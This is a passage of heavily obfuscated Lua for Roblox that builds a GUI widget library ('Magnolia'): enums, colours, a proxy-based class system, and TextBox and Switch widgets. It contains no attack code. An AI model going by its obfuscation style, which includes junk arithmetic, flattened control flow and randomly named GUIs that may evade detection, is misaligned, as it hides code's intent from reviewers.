									v3388.__tostring = function()
										return v3388.Path;
									end;
									v3386 = 3;
								end
								if (v3386 == (6 - 3)) then
									v1707[v3384] = v3387;
									v1617[v3387] = v1707;
									v3386 = 4 + 0;
								end
								if (v3386 == (1811 - (518 + 1289))) then
									if (type(v3385) == "table") then
										setmetatable(v3385, {__newindex=v1356});
									end
									break;
								end
							end
						end
						setmetatable(v1707, {__newindex=v1356});
						v2786 = 1 - 0;
					end
					if (v2786 == 1) then
						v1616[v1706] = v1707;
						break;
					end
				end
			else
				return error("what the frik, how can an Enum not be a table, you bakaro!!");
			end
		end;
		do
			local v1708 = 0 + 0;
			while true do
				if (v1708 == (3 - 0)) then
					v1355.MetroLocation = {TopLeft={AnchorPoint=Vector2.new(0 + 0, 469 - (304 + 165)),Position=UDim2.new(0 + 0, 160 - (54 + 106), 0, 1969 - (1618 + 351)),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=1,BOffsetY=1},TopCenter={AnchorPoint=Vector2.new(0.5 + 0, 1016 - (10 + 1006)),Position=UDim2.new(0.5 + 0, 0 + 0, 0 - 0, 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=(1033 - (912 + 121)),BOffsetY=(1 + 0)},TopRight={AnchorPoint=Vector2.new(1290 - (1140 + 149), 0 + 0),Position=UDim2.new(1 - 0, 0 + 0, 0 - 0, 0 - 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=-1,BOffsetY=1},LeftTop={AnchorPoint=Vector2.new(0, 0 + 0),Position=UDim2.new(0 - 0, 186 - (165 + 21), 111 - (61 + 50), 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=(1 + 0),BOffsetY=(4 - 3)},LeftCenter={AnchorPoint=Vector2.new(0, 0.5),Position=UDim2.new(0 - 0, 0 + 0, 0.5, 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=1,BOffsetY=0},LeftBottom={AnchorPoint=Vector2.new(0, 1461 - (1295 + 165)),Position=UDim2.new(0 + 0, 0 + 0, 1398 - (819 + 578), 1402 - (331 + 1071)),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=(744 - (588 + 155)),BOffsetY=-(1283 - (546 + 736))},RightTop={AnchorPoint=Vector2.new(1938 - (1834 + 103), 0),Position=UDim2.new(1, 0 + 0, 0 - 0, 1766 - (1536 + 230)),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=-(492 - (128 + 363)),BOffsetY=(1 + 0)},RightCenter={AnchorPoint=Vector2.new(2 - 1, 0.5 + 0),Position=UDim2.new(1 - 0, 0 - 0, 0.5 - 0, 0 + 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=-1,BOffsetY=(1009 - (615 + 394))},RightBottom={AnchorPoint=Vector2.new(1, 1 + 0),Position=UDim2.new(1 + 0, 0 - 0, 1, 0),SizeConstraint="Y",ThicknessConstraint="X",BOffsetX=-(4 - 3),BOffsetY=-(652 - (59 + 592))},BottomLeft={AnchorPoint=Vector2.new(0 - 0, 1 - 0),Position=UDim2.new(0 + 0, 171 - (70 + 101), 2 - 1, 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=(1 + 0),BOffsetY=-(2 - 1)},BottomCenter={AnchorPoint=Vector2.new(241.5 - (123 + 118), 1 + 0),Position=UDim2.new(0.5, 0 + 0, 1400 - (653 + 746), 0 - 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=(0 - 0),BOffsetY=-(2 - 1)},BottomRight={AnchorPoint=Vector2.new(1, 1 + 0),Position=UDim2.new(1 + 0, 0 + 0, 1 + 0, 0 + 0),SizeConstraint="X",ThicknessConstraint="Y",BOffsetX=-1,BOffsetY=-(2 - 1)}};
					break;
				end
				if (v1708 == 0) then
					v1355.CornerType = {Sharp="rbxassetid://3457842171",Smooth="rbxassetid://3457843087",Edged="rbxassetid://3457843868",None="",[0 + 0]="rbxassetid://3457842171",[1 - 0]="rbxassetid://3457843087",[1236 - (885 + 349)]="rbxassetid://3457843868",[3 + 0]=""};
					v1355.SliderType = {Box=v1355.CornerType.Sharp.Value,Round=v1355.CornerType.Smooth.Value,Diamond=v1355.CornerType.Edged.Value,Custom=v1355.CornerType.None.Value};
					v1708 = 2 - 1;
				end
				if (v1708 == 2) then
					v1355.NotificationType = {Info="rbxassetid://4057220511",Error="rbxassetid://4057319805",Success="rbxassetid://5774307837",Warn="rbxassetid://5849784138",None="",[0 - 0]="rbxassetid://4057220511",[1]="rbxassetid://4057319805",[970 - (915 + 53)]="rbxassetid://5774307837",[3]="rbxassetid://5849784138",[4]=""};
					v1355.TabControlType = {Top=(801 - (768 + 33)),Right=(3 - 2),Bottom=(2 - 0),Left=(331 - (287 + 41)),[847 - (638 + 209)]=(0 + 0),[1687 - (96 + 1590)]=1,[1674 - (741 + 931)]=(1 + 1),[3]=(8 - 5)};
					v1708 = 3;
				end
				if (v1708 == (4 - 3)) then
					v1355.CheckBoxType = {Sharp=0,Smooth=1,Circular=(1 + 1),Diamond=3,None=(2 + 2),[0 + 0]=(0 - 0),[1 + 0]=(1 + 0),[8 - 6]=(2 + 0),[3]=(497 - (64 + 430)),[4 + 0]=4};
					v1355.FillBoxType = {Sharp="rbxassetid://4049002850",Smooth="rbxassetid://4049766910",Circular="rbxassetid://4049877539",[0]="rbxassetid://4049002850",[364 - (106 + 257)]="rbxassetid://4049766910",[2]="rbxassetid://4049877539"};
					v1708 = 2;
				end
			end
		end
		M_EnumsMeta.__newindex = v1356;
		function v1357(v1709)
			if v1617[v1709] then
				return true;
			else
				return false;
			end
		end
	end
	local v1358, v1359, v1360, v1361;
	do
		do
			v1358 = {DimMidnightBlue=Color3.fromRGB(32, 34, 27 + 10),MidnightBlue=Color3.fromRGB(768 - (496 + 225), 99 - 50, 263 - 209),LightMidnightBlue=Color3.fromRGB(1712 - (256 + 1402), 1956 - (30 + 1869), 63),WetAsphalt=Color3.fromRGB(1413 - (213 + 1156), 250 - (96 + 92), 80),Asphalt=Color3.fromRGB(9 + 43, 972 - (142 + 757), 94),Midnight=Color3.fromRGB(39 + 8, 53, 27 + 39),ElectricBlue=Color3.fromRGB(52, 231 - (32 + 47), 219),Blurple=Color3.fromRGB(2049 - (1053 + 924), 51 + 1, 364 - 152),Exodus=Color3.fromRGB(1752 - (685 + 963), 221 - 112, 349 - 125),Komaru=Color3.fromRGB(1757 - (541 + 1168), 1648 - (645 + 952), 945 - (669 + 169)),DimKomaru=Color3.fromRGB(19, 51 - 36, 64),LightExodus=Color3.fromRGB(126, 214, 223),Amythest=Color3.fromRGB(336 - 181, 31 + 58, 41 + 141),Wisteria=Color3.fromRGB(907 - (181 + 584), 68, 1568 - (665 + 730)),Emerald=Color3.fromRGB(132 - 86, 415 - 211, 1463 - (540 + 810)),Carrot=Color3.fromRGB(230, 503 - 377, 93 - 59),Orange=Color3.fromRGB(243, 125 + 31, 221 - (166 + 37)),SunFlower=Color3.fromRGB(2122 - (22 + 1859), 1968 - (843 + 929), 277 - (30 + 232)),Ruby=Color3.fromRGB(231, 217 - 141, 837 - (55 + 722)),Rose=Color3.fromRGB(411 - 219, 1732 - (78 + 1597), 43),LightPink=Color3.fromRGB(255, 27 + 94, 111 + 10),DimPink=Color3.fromRGB(235, 77, 75),Pink=Color3.fromRGB(188 + 36, 635 - (305 + 244), 235 + 18),SteelPink=Color3.fromRGB(224, 86, 358 - (95 + 10)),Light=Color3.fromRGB(151 + 62, 687 - 470, 348 - 93),Cloud=Color3.fromRGB(998 - (592 + 170), 240, 840 - 599),Silver=Color3.fromRGB(474 - 285, 91 + 104, 199),Concrete=Color3.fromRGB(58 + 91, 165, 166),Abestos=Color3.fromRGB(306 - 179, 23 + 117, 141)};
		end
		do
			local v1710 = 0 - 0;
			while true do
				if (v1710 == (507 - (353 + 154))) then
					v1359 = {Map=function(v3129, v3130, v3131, v3132, v3133)
						return (((v3129 - v3130) / (v3131 - v3130)) * (v3133 - v3132)) + v3132;
					end,MapColor=function(v3134, v3135, v3136, v3137, v3138)
						local v3139 = v1359.Map;
						return Color3.new(v3139(v3138, v3136, v3137, v3134.r, v3135.r), v3139(v3138, v3136, v3137, v3134.g, v3135.g), v3139(v3138, v3136, v3137, v3134.b, v3135.b));
					end,Round=function(v3140)
						local v3141 = math.floor(v3140);
						local v3142 = math.floor(v3140) + (1 - 0);
						local v3143 = -(v3141 - v3140);
						local v3144 = v3142 - v3140;
						if (v3144 > v3143) then
							return v3141;
						else
							return v3142;
						end
					end,ZigZag=function(v3145)
						return math.acos(math.cos(v3145 * math.pi)) / math.pi;
					end};
					v1360 = v1359.Map;
					break;
				end
			end
		end
		do
			v1361 = {CornerSize=(8 - 2),CornerType=v1355.CornerType.Smooth,BackgroundColor=v1358.MidnightBlue,BackgroundTransparency=(0 + 0),BorderSize=(0 + 0),BorderColor=Color3.new(0 + 0, 0, 0),BorderTransparency=(1 - 0),TextColor=v1358.Silver,TextTransparency=0,Font=Enum.Font.Legacy,TextStrokeColor=v1358.Abestos,TextStrokeTransparency=(1 - 0),TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,PlaceholderColor=v1358.Silver,ZIndex=(2 - 1),SecondaryColor=v1358.DimMidnightBlue,HighlightColor=v1358.ElectricBlue,MetroStyle=true};
		end
	end
	local v1362 = {};
	local v1363, v1364, v1365, v1366, v1367, v1368, v1369;
	do
		local v1621 = {};
		local v1622 = {};
		local v1623 = {};
		local v1624 = {};
		v1368 = v1621;
		local v1625 = {AbsolutePosition="__Base2D",AbsoluteRotation="__Base2D",AbsoluteSize="__Base2D",Active="__Base2D",AnchorPoint="__Base2D",ClipsDescendants="__Base2D",LayoutOrder="__Base2D",Position="__Base2D",Rotation="__Base2D",Size="__Base2D",SizeConstraint="__Base2D",Visible="__Base2D",ZIndex="__Base2D",Parent="__Base2D",Name="__Base2D",Font="__TextRender",LineHeight="__TextRender",LocalizedText="__TextRender",Text="__TextRender",TextBounds="__TextRender",TextColor3="__TextRender",TextFits="__TextRender",TextScaled="__TextRender",TextSize="__TextRender",TextStrokeColor3="__TextRender",TextStrokeTransparency="__TextRender",TextTransparency="__TextRender",TextTruncate="__TextRender",TextWrapped="__TextRender",TextXAlignment="__TextRender",TextYAlignment="__TextRender",CornerRadius="__UICorner",HoverImage="__ImageRender",Image="__ImageRender",ImageColor3="__ImageRender",ImageRectOffset="__ImageRender",ImageRectSize="__ImageRender",ImageTransparency="__ImageRender",IsLoaded="__ImageRender",PressedImage="__ImageRender",ScaleType="__ImageRender",SliceCenter="__ImageRender",SliceScale="__ImageRender",TileSize="__ImageRender",IsFocused="__TextBox",PlaceholderColor3="__TextBox",PlaceholderText="__TextBox",ClearTextOnFocus="__TextBox",TextEditable="__TextBox",CursorPosition="__TextBox",SelectionStart="__TextBox",Selectable="__TextBox",Color="__Background",BackgroundColor="__Background",BackgroundColor3="__Background",BackgroundTransparency="__Background",Transparency="__Background",Type="__Background",CornerType="__Background",CornerSize="__Background",TopLeft="__Background",TopBorder="__Background",TopRight="__Background",LeftBorder="__Background",RightBorder="__Background",BottomLeft="__Background",BottomBorder="__Background",BottomRight="__Background",BorderSizePixel="__Background",BorderSize="__Background",BorderColor3="__Background",BorderColor="__Background",BorderTransparency="__Background",CreateBorder="__Background",TweenPosition="__Base2D",TweennSize="__Base2D",TweenSizeAndPosition="__Base2D",SetTextFromInput="__CHitbox",CaptureFocus="__TextBox",ReleaseFocus="__TextBox",MouseButton1Click="__CHitbox",MouseButton2Click="__CHitbox",MouseButton1Down="__CHitbox",MouseButton2Down="__CHitbox",MouseButton1Up="__CHitbox",MouseButton2Up="__CHitbox",MouseEnter="__CHitbox",MouseLeave="__CHitbox",MouseMoved="__CHitbox",MouseWheelBackward="__Base2D",MouseWheelForward="__Base2D",InputBegan="__CHitbox",InputEnded="__CHitbox",InputChanged="__CHitbox",Focused="__TextBox",FocusLost="__TextBox"};
		function v1366(v1711)
			if (typeof(v1711) == "Instance") then
				return v1711;
			else
				local v2787 = v1622[v1711];
				return v2787 and v2787.__Instance;
			end
		end
		function v1367()
			local v1712 = v1352();
			local v1713 = Instance.new("ScreenGui");
			if v1353 then
				v1353(v1713);
			end
			v1713.Name = v1354.RandomString(math.random(91 - (7 + 79), 5 + 5));
			v1713.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
			v1713.Parent = v1712;
			return v1713;
		end
		do
			v1369 = {Destroy=function(v2484)
				local v2485 = v1334(v2484);
				v1362[v2484] = true;
				for v2788, v2789 in next, v2485 do
					if (v2789 ~= v2484) then
						if (typeof(v2789) == "Instance") then
							if (v2789.ClassName == "BindableEvent") then
								v2789:Destroy();
							end
						elseif ((type(v2789) == "userdata") and v1622[v2789] and (v1362[v2789] == nil)) then
							v2789:Destroy();
						end
					end
				end
				v2485.__Instance:Destroy();
			end,GetMeta=function(v2487)
				return v1622[v2487];
			end};
		end
		v1334 = v1369.GetMeta;
		local v1627 = function(v1718, v1719, v1720)
			if v1718 then
				local v2790 = v1718:byte(1, 1);
				local v2791 = v1718:byte(183 - (24 + 157), 3 - 1);
				local v2792 = v1718:sub(8 - 4, -(1 + 0));
				if ((v1720 == nil) and (v2791 == (2 - 1))) then
					return v1720;
				end
				if (v2790 == (380 - (262 + 118))) then
					if (v1357(v1720) and (v1720.Type == v2792)) then
						return v1720;
					else
						return false, "Invalid MagnoliaEnum value. Expected " .. v2792 .. ".";
					end
				elseif (v2790 == (1084 - (1038 + 45))) then
					local v3389 = 0;
					local v3390;
					while true do
						if (v3389 == (0 - 0)) then
							v3390 = v1366(v1720);
							if (typeof(v3390) == "Instance") then
								return v3390;
							else
								return false, "Invalid Base Instance for " .. v1719 .. ". Got " .. typeof(v1720) .. ".";
							end
							break;
						end
					end
				elseif (v2790 == 2) then
					return v1720;
				elseif ((v2790 == 3) or (v2790 == (234 - (19 + 211)))) then
					local v3543 = 113 - (88 + 25);
					local v3544;
					while true do
						if (v3543 == (0 - 0)) then
							v3544 = ((v2790 == (2 + 1)) and v3544) or typeof;
							if (v3544(v1720) == v2792) then
								return v1720;
							else
								return false, "Invalid type for " .. v1719 .. ". " .. v2792 .. " expected, got " .. typeof(v1720) .. ".";
							end
							break;
						end
					end
				end
			end
		end;
		function v1363(v1721, v1722, v1723, v1724, v1725, v1726)
			if v1621[v1721] then
				warn("You are creating a Magnolia class withe the existing ClassName, " .. v1721 .. ". Your new class will replace the old one.");
			end
			local v1727 = {};
			v1727.Fields = v1722;
			v1727.Routing = v1723;
			v1727.Constructor = v1724;
			v1727.ClassName = v1721;
			v1727.Methods = v1726;
			local v1733 = setmetatable({}, {__index=function()
				return function()
				end;
			end});
			v1725(v1733);
			v1727.Draw = v1733;
			for v2488, v2489 in next, v1723 do
				if (not v1722[v2489] and not v1726[v2489]) then
					v1723[v2488] = nil;
					error("Magnolia Create Class, figured out that you defined a route " .. v2488 .. ", that point to an inexistent field " .. v2489);
				end
			end
			for v2490, v2491 in next, v1369 do
				if not v1722[v2490] then
					v1722[v2490] = {"\3\0\1function",v2491};
				end
			end
			for v2492, v2493 in next, v1726 do
				v1722[v2492] = {"\3\0\1function",v2493};
			end
			if not v1722['ClassName'] then
				v1722['ClassName'] = {"\3\0\1string",v1721};
			end
			v1621[v1721] = v1727;
			return v1727;
		end
		M_Meta = {__index=function(v1736, v1737)
			local v1738 = 0 - 0;
			local v1739;
			local v1740;
			local v1741;
			local v1742;
			local v1743;
			local v1744;
			while true do
				if (v1738 == (4 - 3)) then
					if v1740.Fields[v1737] then
						return v1741[v1737];
					end
					v1742 = v1740.Routing[v1737];
					if v1742 then
						return v1741[v1742];
					end
					v1738 = 1 + 1;
				end
				if ((814 - (340 + 471)) == v1738) then
					if (v1744 and v1744:FindFirstChild(v1737)) then
						return v1744[v1737];
					end
					return error("Unable to index MagnoliaInstance with, \'" .. v1737 .. "\'");
				end
				if (v1738 == 2) then
					v1743 = v1625[v1737];
					if (v1743 and v1739[v1743]) then
						return v1739[v1743][v1737];
					end
					v1744 = v1739.__Instance;
					v1738 = 7 - 4;
				end
				if (v1738 == (589 - (276 + 313))) then
					v1739 = v1622[v1736];
					v1740 = v1739.__ClassData;
					v1741 = v1739.__Fields;
					v1738 = 1;
				end
			end
		end,__newindex=function(v1745, v1746, v1747)
			local v1748 = 0 - 0;
			local v1749;
			local v1750;
			local v1751;
			local v1746;
			local v1752;
			while true do
				if (v1748 == (2 + 0)) then
					v1752 = v1750.Fields[v1746];
					if v1752 then
						local v3284 = 0 + 0;
						local v3285;
						local v3286;
						local v3287;
						while true do
							if (v3284 == (1 + 0)) then
								v3286, v3287 = v1627(v1752[1], v1746, v3286);
								if v3287 then
									return error(v3287);
								end
								v3284 = 1974 - (495 + 1477);
							end
							if (v3284 == (8 - 5)) then
								return;
							end
							if ((0 + 0) == v3284) then
								v3285 = v1752[404 - (342 + 61)]:byte(2 + 1, 168 - (4 + 161));
								if (v3285 == (1 + 0)) then
									return error(v1746 .. " is read-only.");
								end
								v3284 = 3 - 2;
							end
							if (v3284 == 2) then
								if (v1751[v1746] ~= v3286) then
									local v3545 = v1751[v1746];
									v1751[v1746] = v3286;
									v1750.Draw[v1746](v1749, v1751, v3545, v1745);
								end
								v1749.__ChangeSignal:Fire(v1746, v3286);
								v3284 = 7 - 4;
							end
						end
					else
						local v3288 = 497 - (322 + 175);
						local v3289;
						while true do
							if (v3288 == (563 - (173 + 390))) then
								v3289 = v1625[v1746];
								if (v3289 and (typeof(v1749[v3289]) == "Instance")) then
									local v3547 = 0 + 0;
									while true do
										if ((314 - (203 + 111)) == v3547) then
											v1749[v3289][v1746] = v1747;
											return;
										end
									end
								end
								break;
							end
						end
					end
					v1748 = 1 + 2;
				end
				if (v1748 == (3 + 0)) then
					return error("Unable to newindex field " .. v1746);
				end
				if (v1748 == (0 - 0)) then
					v1749 = v1622[v1745];
					v1750 = v1749.__ClassData;
					v1748 = 1 + 0;
				end
				if (v1748 == (707 - (57 + 649))) then
					v1751 = v1749.__Fields;
					v1746 = v1750.Routing[v1746] or v1746;
					v1748 = 386 - (328 + 56);
				end
			end
		end,__tostring=function(v1753)
			local v1754 = 0 + 0;
			local v1755;
			while true do
				if (v1754 == (512 - (433 + 79))) then
					v1755 = v1622[v1753];
					return v1755.tostring or v1755.__Fields.Name or v1755.__ClassData.ClassName;
				end
			end
		end,__metatable="Can you pleawse don\'t cwash magnowia OwO",__redraw=function(v1756)
			local v1757 = 0 + 0;
			local v1758;
			local v1759;
			local v1760;
			local v1761;
			while true do
				if (v1757 == (1 + 0)) then
					v1760 = v1758.__ClassData;
					v1761 = {};
					v1757 = 2;
				end
				if ((0 - 0) == v1757) then
					v1758 = v1334(v1756);
					v1759 = v1758.__Fields;
					v1757 = 1;
				end
				if (v1757 == (9 - 7)) then
					table.foreach(v1760.Draw, function(v3146, v3147)
						if v1761[v3147] then
							return;
						end
						v1761[v3147] = v3146;
						v3147(v1758, v1759, nil, v1756);
					end);
					break;
				end
			end
		end};
		local v1628 = function(v1762)
			local v1763 = newproxy(true);
			local v1764 = getmetatable(v1763);
			local v1765 = Instance.new("BindableEvent");
			local v1766 = {};
			v1765.Name = "MagnoliaChangeSignal";
			v1764.__index = M_Meta.__index;
			v1764.__newindex = M_Meta.__newindex;
			v1764.__tostring = M_Meta.__tostring;
			v1764.__metatable = M_Meta.__metatable;
			v1764.__ClassData = v1762;
			v1764.__Proxy = v1763;
			v1764.__Fields = v1766;
			v1764.__ChangeSignal = v1765;
			v1764.Draw = v1762.Draw;
			v1762.Fields.Redraw = {"\3\0\1function",M_Meta.__redraw};
			for v2495, v2496 in next, v1762.Fields do
				local v2497 = 0 + 0;
				local v2498;
				while true do
					if (v2497 == (1036 - (562 + 474))) then
						v2498 = v2496[2 - 1]:sub(7 - 3, -(906 - (76 + 829)));
						if (v2498 == "Event") then
							local v3391 = Instance.new("BindableEvent");
							v3391.Name = v2495;
							v1764[v2495] = v3391;
							v1766[v2495] = v3391.Event;
							v2496[1]:gsub("Event", "Instance");
						else
							v1766[v2495] = v2496[1675 - (1506 + 167)];
						end
						break;
					end
				end
			end
			v1622[v1763] = v1764;
			return v1763, v1764;
		end;
		function v1364(v1784, ...)
			local v1785 = 0;
			local v1786;
			while true do
				if ((0 - 0) == v1785) then
					v1786 = v1621[v1784];
					if v1786 then
						local v3290 = v1786.Constructor;
						local v3291, v3292 = v1628(v1786);
						v3290(v3291, ...);
						if v3292.__Instance then
							v1623[v3291] = v3292.__Instance;
						end
						return v3291;
					else
						local v3293 = 266 - (58 + 208);
						local v3294;
						while true do
							if (v3293 == (0 + 0)) then
								v3294 = v1354.SearchField(v1621, v1784, true);
								if v3294 then
									return error("unable to find magnolia class, " .. v1784 .. ". Did you mean " .. v3294 .. "?");
								end
								v3293 = 1 + 0;
							end
							if (v3293 == (1 + 0)) then
								return error("unable to find magnolia class, " .. v1784 .. ".");
							end
						end
					end
					break;
				end
			end
		end
		function v1365(v1787)
			if v1622[v1787] then
				return true;
			else
				return false;
			end
		end
	end
	local v1370;
	do
		v1363("TextBox", {Value={"\3\0\1string",""},BackgroundColor3={"\4\0\0Color3",v1361.BackgroundColor},AutoTextBoxColor={"\3\0\0boolean",true},FocusedColor3={"\4\0\0Color3",v1361.SecondaryColor},PasswordChar={"\3\0\0string",""},TextTransparency={"\3\0\0number",v1361.TextTransparency},IsFocused={"\3\0\1boolean",false},RoundRadius={"\3\0\0number",0.042},MetroStyle={"\3\0\0boolean",true},MetroDirection={"\4\0\0UDim2"},MetroStartColor3={"\4\0\0Color3",v1361.HighlightColor},MetroEndColor3={"\4\0\0Color3",v1361.HighlightColor},MetroStartTransparency={"\3\0\0number",(0 - 0)},MetroEndTransparency={"\3\0\0number",(0 - 0)},MetroStartSize={"\3\0\0number",(3 + 0)},MetroEndSize={"\3\0\0number",3},MetroTweenInfo={"\4\0\0TweenInfo"},Writing={"\4\0\1Event"}}, {ValueChanged="Writing",MetroStartColor="MetroStartColor3",MetroEndColor="MetroEndColor3"}, function(v1788, v1789)
			local v1790 = v1334(v1788);
			local v1791 = v1790.__Fields;
			v1791.MetroDirection = UDim2.new(0 - 0, 1, 1, 1786 - (1476 + 309));
			v1791.MetroTweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out);
			local v1794 = Instance.new("Frame", v1366(v1789));
			local v1795 = Instance.new("TextBox", v1794);
			local v1796 = Instance.new("TextLabel", v1794);
			local v1797 = Instance.new("ImageLabel", v1794);
			v1794.BackgroundTransparency = 1;
			v1794.BorderSizePixel = 1284 - (299 + 985);
			v1794.Name = "MagnoliaTextBox";
			v1794.Size = UDim2.new(0 + 0, 105, 0 - 0, 118 - (86 + 7));
			v1794.ZIndex = v1361.ZIndex;
			v1797.Name = v1335 .. "Background";
			v1797.Image = "rbxassetid://3570695787";
			v1797.ScaleType = Enum.ScaleType.Slice;
			v1797.Size = UDim2.new(4 - 3, 0, 1 + 0, 880 - (672 + 208));
			v1797.SliceCenter = Rect.new(43 + 57, 100, 100, 232 - (14 + 118));
			v1797.Position = UDim2.new(445.5 - (339 + 106), 0 + 0, 0 + 0, 0);
			v1797.AnchorPoint = Vector2.new(1395.5 - (440 + 955), 0 + 0);
			v1797.BackgroundTransparency = 1 - 0;
			v1797.ZIndex = v1794.ZIndex;
			local v1814 = v1797:Clone();
			v1814.Name = v1335 .. "Underline";
			v1814.Parent = v1794;
			v1814.AnchorPoint = Vector2.new(0.5 + 0, 2 - 1);
			v1814.Position = UDim2.new(0.5, 0 + 0, 354 - (260 + 93), 0);
			v1814.Size = UDim2.new(0 + 0, 0 - 0, 0.12, 0 - 0);
			v1814.Rotation = 2154 - (1181 + 793);
			v1814.ImageRectSize = Vector2.new(200, 31 + 89);
			v1795.Name = v1335 .. "TextRender";
			v1795.Text = v1791.Value;
			v1795.BackgroundTransparency = 1;
			v1795.BorderSizePixel = 307 - (105 + 202);
			v1795.Size = UDim2.new(1 + 0, 0, 811 - (352 + 458), 0 - 0);
			v1795.Position = UDim2.new(0.5 - 0, 0 + 0, 0.5, 0 - 0);
			v1795.AnchorPoint = Vector2.new(949.5 - (438 + 511), 1383.5 - (1262 + 121));
			v1795.ZIndex = 10;
			v1795.TextColor3 = v1361.TextColor;
			v1795.TextTransparency = v1361.TextTransparency;
			v1795.Font = v1361.Font;
			v1795.TextStrokeColor3 = v1361.TextStrokeColor;
			v1795.TextStrokeTransparency = v1361.TextStrokeTransparency;
			v1795.TextXAlignment = v1361.TextXAlignment;
			v1795.TextYAlignment = v1361.TextYAlignment;
			v1795.PlaceholderColor3 = v1361.PlaceholderColor;
			v1796.Name = v1335 .. "PasswordChar";
			v1796.Text = "";
			v1796.BackgroundTransparency = 1;
			v1796.BorderSizePixel = 0;
			v1796.Size = UDim2.new(1069 - (728 + 340), 0, 1, 0);
			v1796.Position = UDim2.new(1790.5 - (816 + 974), 0 - 0, 0.5 - 0, 339 - (163 + 176));
			v1796.AnchorPoint = Vector2.new(0.5 - 0, 0.5);
			v1796.TextColor3 = v1361.TextColor;
			v1796.TextTransparency = v1361.TextTransparency;
			v1796.Font = v1361.Font;
			v1796.TextStrokeColor3 = v1361.TextStrokeColor;
			v1796.TextStrokeTransparency = v1361.TextStrokeTransparency;
			v1796.TextXAlignment = v1361.TextXAlignment;
			v1796.TextYAlignment = v1361.TextYAlignment;
			v1795.Focused:Connect(function()
				v1791.IsFocused = true;
				v1814.ImageColor3 = v1791.MetroStartColor3;
				v1338:Create(v1814, v1791.MetroTweenInfo, {ImageColor3=v1791.MetroEndColor3,Size=UDim2.new(1, 0 - 0, v1814.Size.Y.Scale, 0 + 0)}):Play();
				if v1791.AutoTextBoxColor then
					v1338:Create(v1795, v1791.MetroTweenInfo, {TextColor3=v1791.MetroEndColor3}):Play();
				end
			end);
			v1795.FocusLost:Connect(function()
				local v2502 = 1810 - (1564 + 246);
				while true do
					if (v2502 == (346 - (124 + 221))) then
						v1338:Create(v1814, v1791.MetroTweenInfo, {ImageColor3=v1791.MetroStartColor3,Size=UDim2.new(0, 0, v1814.Size.Y.Scale, 0 + 0)}):Play();
						if v1791.AutoTextBoxColor then
							v1338:Create(v1795, v1791.MetroTweenInfo, {TextColor3=v1791.MetroStartColor3}):Play();
						end
						break;
					end
					if (v2502 == (451 - (115 + 336))) then
						v1791.IsFocused = false;
						v1814.ImageColor3 = v1791.MetroEndColor3;
						v2502 = 1 - 0;
					end
				end
			end);
			v1795.Changed:Connect(function(v2503)
				if (v1791.IsFocused and (v2503 == "Text")) then
					v1791.Value = v1795.Text;
					v1790.Writing:Fire(v1795.Text);
				end
			end);
			v1790.__Instance = v1794;
			v1790.__Base2D = v1794;
			v1790.__Background = v1797;
			v1790.__TextRender = v1795;
			v1790.__TextBox = v1795;
			v1790.__ImageRender = v1797;
			v1790.Underline = v1814;
			v1790.PasswordChar = v1796;
			v1791.Redraw(v1788);
		end, function(v1869)
			v1869['BackgroundColor3'] = function(v2504, v2505)
				if (not v2505.AutoTextBoxColor or not v2504.__TextBox:IsFocused()) then
					v2504.__Background.ImageColor3 = v2505.BackgroundColor3;
				end
			end;
			v1869['RoundRadius'] = function(v2506, v2507)
				local v2507 = v2506.__Fields;
				v2506.__Background.SliceScale = v2507.RoundRadius;
				v2506.Underline.SliceScale = v2507.RoundRadius;
			end;
		end, {});
		v1363("Switch", {Size={"\4\0\0Vector2",Vector2.new(3 + 37, 2010 - (1282 + 708))},Enabled={"\3\0\0boolean",true},Value={"\3\0\1boolean",false},BarTransparency={"\3\0\0number",0},BarThickness={"\3\0\0number",18},MarkupImage={"\3\0\0string","rbxassetid://3457843087"},MarkupColor3={"\4\0\0Color3",v1358.Cloud},MarkupTransparency={"\3\0\0number",(0 - 0)},MarkupSize={"\4\0\0number",(0.8 - 0)},SliderType={"\0\0\0SliderType",v1355.SliderType.Round},SideSheet={"\3\0\0string",""},BarOnlineColor3={"\4\0\0Color3",Color3.fromRGB(104 + 11, 415 - (215 + 65), 219)},BarOfflineColor3={"\4\0\0Color3",Color3.fromRGB(1971 - (1541 + 318), 102 + 13, 63 + 61)},MarkupSizeOffset={"\4\0\0number",(3 + 1)},MarkupDistance={"\4\0\0number",(1283 - (883 + 397))},ClickDarkness={"\4\0\0number",(78 - 58)},TogleTweenInfo={"\4\0\0TweenInfo",TweenInfo.new(1487.2 - (85 + 1402), Enum.EasingStyle.Linear, Enum.EasingDirection.In)},ValueChanged={"\4\0\1Event"}}, {BarOnlineColor="BarOnlineColor3",BarOfflineColor="BarOfflineColor3",MarkupColor="MarkupColor3"}, function(v1872, v1873, v1874)
			local v1875 = v1334(v1872);
			local v1876 = v1875.__Fields;
			local v1877 = Instance.new("Frame", v1366(v1873));
			local v1878 = Instance.new("Frame", v1877);
			local v1879 = Instance.new("ImageLabel", v1878);
			local v1880 = Instance.new("ImageLabel", v1878);
			local v1881 = Instance.new("ImageLabel", v1878);
			local v1882 = Instance.new("TextButton", v1877);
			v1877.Name = v1335 .. "MagnoliaSwitch";
			v1877.BorderSizePixel = 0 - 0;
			v1877.BackgroundTransparency = 404 - (274 + 129);
			v1880.BackgroundTransparency = 1;
			v1880.BorderSizePixel = 217 - (12 + 205);
			v1880.AnchorPoint = Vector2.new(0, 0.5 + 0);
			v1880.Position = UDim2.new(3 - 2, 0 + 0, 384.5 - (27 + 357), 0);
			v1880.ImageRectSize = Vector2.new(880 - (91 + 389), 1097 - (90 + 207));
			v1880.ImageRectOffset = Vector2.new(16 + 384, 861 - (706 + 155));
			v1880.Name = v1335 .. "RightSide";
			v1879.BackgroundTransparency = 1;
			v1879.BorderSizePixel = 1795 - (730 + 1065);
			v1879.AnchorPoint = Vector2.new(1564 - (1339 + 224), 0.5);
